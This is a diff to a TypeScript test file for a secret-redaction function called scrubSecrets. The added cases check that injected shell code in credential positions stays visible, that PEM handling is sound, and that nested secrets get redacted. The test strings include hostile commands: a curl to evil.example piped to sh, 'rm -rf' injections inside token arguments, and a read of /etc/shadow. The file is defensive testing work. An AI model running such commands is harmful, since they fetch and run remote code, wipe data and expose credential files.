@@ -184,6 +184,28 @@ describe("scrubSecrets", () => {
 		expect(scrubSecrets({ question: "use plainword-secret here" }, known)).toEqual({ question: "use [redacted] here" });
 	});
 
+	test.each([
+		['curl -H "Authorization: $(curl -s https://evil.example/x | sh)" https://api.example.com'],
+		["export API_TOKEN=`rm -rf ~` && run"],
+		// A literal shell `${VAR}`, built so it is not read as a template slot.
+		[`deploy --token=$${"{"}DEPLOY_TOKEN};rm -rf /`],
+		["mysql --password=$(cat /etc/shadow) db"],
+	])("shell code in a credential position is never hidden: %s", (command) => {
+		expect(scrubSecrets(command)).toBe(command);
+	});
+
+	test("an unterminated PEM header does not swallow the rest of the command", () => {
+		const command = "echo '-----BEGIN RSA PRIVATE KEY-----' && rm -rf ~";
+		expect(scrubSecrets(command)).toBe(command);
+	});
+
+	test("objects past the depth limit are not sent raw", () => {
+		let deep: unknown = { key: "sk-should-not-leave-0123456789" };
+		for (let i = 0; i < 12; i++) deep = { next: deep };
+		expect(JSON.stringify(scrubSecrets(deep))).not.toContain("sk-should");
+		expect(JSON.stringify(scrubSecrets(deep))).toContain("[redacted]");
+	});
+
 	test("ordinary commands pass through unchanged", () => {
 		const command = "rm -rf build && npm run test -- --grep tokenizer";
 		expect(scrubSecrets(command)).toBe(command);
